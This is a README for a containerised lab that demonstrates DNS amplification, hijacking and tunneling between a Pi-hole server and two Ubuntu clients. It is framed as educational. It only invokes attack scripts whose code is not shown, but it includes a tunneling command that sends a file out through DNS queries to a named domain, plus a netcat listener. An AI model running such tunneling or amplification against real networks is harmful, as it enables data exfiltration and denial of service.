
# Container-Based DNS Attacks Demonstration

## Container Setup
- **Pi-hole Server (10.0.0.5):** A container running Pi-hole, acting as the DNS server.
- **DNS Client 1 (10.0.0.2):** An Ubuntu-based container, used as a client or victim in the demonstrations.
- **DNS Client 2 (10.0.0.3):** Another Ubuntu-based container, used as a client or attacker in the demonstrations.

## Overview
This guide provides instructions for demonstrating various DNS attack techniques in a containerized environment. The demonstrations include Amplification Attack, Hijacking, and DNS Tunneling. Please note that these demonstrations are for educational purposes only. Users should proceed with caution and understand the risks involved.

## Prerequisites
- Docker and Docker Compose installed and running
- Relevant Docker containers for the DNS environment set up in a `docker-compose.yml` file

## Starting the Environment
Before beginning the demonstrations, start the environment using Docker Compose:

```bash
docker-compose up -d
```

This command will start all the containers defined in your `docker-compose.yml` file in detached mode.

## Amplification Attack
In this scenario, we demonstrate a DNS Amplification Attack.

1. Execute the DNS Amplification script on DNS Client 2:
   ```bash
   docker exec -it dns-client-2 /bin/bash
   python3 dnsamp.py
   ```

2. Listen for incoming UDP traffic on port 53 on DNS Client 1:
   ```bash
   docker exec -it dns-client-1 /bin/bash
   nc -u -nlvt 53
   ```

## Hijacking
This section demonstrates DNS Hijacking.

1. Execute the DNS Hijacking script on the Pi-hole server:
   ```bash
   docker exec -it pihole /bin/bash
   ./dnshijack.sh
   ```

2. Test DNS resolution to observe hijacking on DNS Client 1:
   ```bash
   docker exec -it dns-client-1 /bin/bash
   nslookup google.com 10.0.0.5
   ```

## DNS Tunneling
Demonstrate DNS Tunneling with the following steps:

1. Execute the DNS Tunneling script on DNS Client 1:
   ```bash
   docker exec -it dns-client-1 bash
   python3 dnstunnel.py to_be_tunneled.txt 10.0.0.5 rak3sh.com
   ```

2. Monitor the Pi-hole logs for tunneling activity on the Pi-hole server:
   ```bash
   docker exec -it pihole /bin/bash
   tail -f /var/log/pihole.log | grep 10.0.0.2
   ```

## Disclaimer
The author is not responsible for any malicious activities arising from the use of this demonstration. This guide is intended for educational purposes only. Users are advised to use this information responsibly and in accordance with applicable laws and ethical guidelines.

## Note
This is a container-based DNS attacks demo. The user should use this at their own risk.
```
